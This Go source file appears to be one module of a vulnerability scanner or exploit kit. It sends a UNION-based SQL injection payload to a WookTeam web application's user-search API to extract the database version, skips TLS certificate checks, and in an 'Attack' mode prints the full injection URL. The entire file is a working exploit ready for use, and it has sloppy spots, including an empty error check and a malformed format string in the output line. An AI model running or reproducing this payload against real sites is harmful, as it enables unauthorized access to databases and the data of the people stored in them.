package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func WookTeam_SQLInjection(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/api/users/searchinfo?where[username]=1%%27%%29+UNION+ALL+SELECT+NULL%%2CCONCAT%%280x7e%%2Cversion%%28%%29%%2C0x7e%%29%%2CNULL%%2CNULL%%2CNULL%%23", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Proxy:           http.ProxyURL(proxyURL()),
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "\"ret\":1") && strings.Contains(string(body), "\"username\":") {
		fmt.Println("[*]WookTeam_SQLInjection : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/api/users/searchinfo?where[username]=1%%27%%29+UNION+ALL+SELECT+NULL%%2CCONCAT%%280x7e%%2Cversion%%28%%29%%2C0x7e%%29%2CNULL%%2CNULL%%2CNULL%%23\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
